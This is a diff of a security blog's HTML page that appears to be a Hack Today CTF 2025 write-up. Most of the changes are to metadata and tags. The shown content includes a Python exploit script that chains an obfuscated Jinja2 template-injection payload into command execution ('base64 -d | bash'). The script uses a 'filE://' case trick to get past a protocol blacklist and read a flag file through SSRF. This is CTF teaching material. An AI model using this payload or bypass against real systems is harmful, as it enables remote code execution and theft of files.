@@ -6,15 +6,15 @@
   <meta name="keywords" content=" ssrf , arbitrary-file-read , ssti ">
   <meta name="description" content="Hack Today CTF 2025 Writeup | Tanknight">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="A personal blog by Tanknight documenting bug bounty hunting, penetration testing, CTF writeups, vulnerability research, web application security, and technical knowledge sharing.">
+<meta name="description" content="IntroductionHello! I’m Tanknight, a cybersecurity researcher, penetration tester, bug bounty hunter, and CTF player specializing in web application security. My interests include vulnerability researc">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Tags">
-<meta property="og:url" content="http://tanknight.blog/tags/index.html">
+<meta property="og:title" content="Tanknight">
+<meta property="og:url" content="http://tanknight.blog/about/index.html">
 <meta property="og:site_name" content="Tanknight">
-<meta property="og:description" content="A personal blog by Tanknight documenting bug bounty hunting, penetration testing, CTF writeups, vulnerability research, web application security, and technical knowledge sharing.">
+<meta property="og:description" content="IntroductionHello! I’m Tanknight, a cybersecurity researcher, penetration tester, bug bounty hunter, and CTF player specializing in web application security. My interests include vulnerability researc">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2026-07-13T13:35:54.000Z">
-<meta property="article:modified_time" content="2026-07-13T13:36:11.689Z">
+<meta property="article:published_time" content="2026-07-15T23:55:28.889Z">
+<meta property="article:modified_time" content="2026-07-15T23:55:07.120Z">
 <meta property="article:author" content="Tanknight">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Linux">
@@ -160,21 +160,6 @@
         <div data-rel="bugbounties">
             
             bugbounties
-            
-        </div>
-        
-    </li>
-
-            
-        
-    
-        
-            
-                
-    <li>
-        <div data-rel="certifications">
-            
-            certifications
             
         </div>
         
@@ -396,7 +381,7 @@
         </a>
         
         
-        <a  class="All certifications "
+        <a  class="All personal "
            href="/2026/07/14/How-I-Passed-the-OSWE-Exam-in-Under-2-Months/"
            data-tag=""
            data-author="" >
@@ -480,7 +465,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2026-07-16 07:52:40'>2026-07-16 07:37</time>
+            Created At : <time class="date" title='Updated At: 2026-07-16 08:04:55'>2026-07-16 07:37</time>
         
     </div>
     <div class="article-meta">
@@ -545,23 +530,14 @@
 <p>The endpoint <a target="_blank" rel="noopener" href="http://internal-server:9000/">http://internal-server:9000/</a> accepts a <code>url</code> parameter, which will be fetched via <code>curl</code>. However, the protocol of this URL will be checked.<br><img src="/../images/Hack-Today-CTF-2025-Writeup-10.png"></p>
 <p>If the URL is <code>file:///flag.txt</code> ⇒ it gets blacklisted. The bypass here is using <code>filE:///flag.txt</code>—when parsed, the protocol becomes <code>filE</code> 😀 (it’s case-sensitive, bro…).</p>
 <pre><code class="language-python">import requests
-
 import base64
-
 URL = "[http://103.160.212.3:5001](http://103.160.212.3:5001)"
-
   
-
 python_code = '''import requests; res = requests.get('http://internal-server:9000/?url=filE:///flag.txt'); print(res.text)'''
-
 python = base64.b64encode(f"""python3 -c "{python_code}" """.encode()).decode()
-
 payload = f"""{{{{(''.__class__.__base__.__subclasses__()|slice(2)|first|reverse|slice(2)|first|reverse|slice(33)|first|reverse|slice(4)|first|first).__init__|attr('__glo'~'bals__')|attr('get')('po'~'pen')('''echo {python} | base64 -d | bash''')|attr('re'~'ad')()}}}}"""
-
   
-
 res = requests.get(URL + "/sub", params={'name':payload})
-
 print(res.text)
 </code></pre>
 <p><img src="/../images/Hack-Today-CTF-2025-Writeup-11.png"></p>
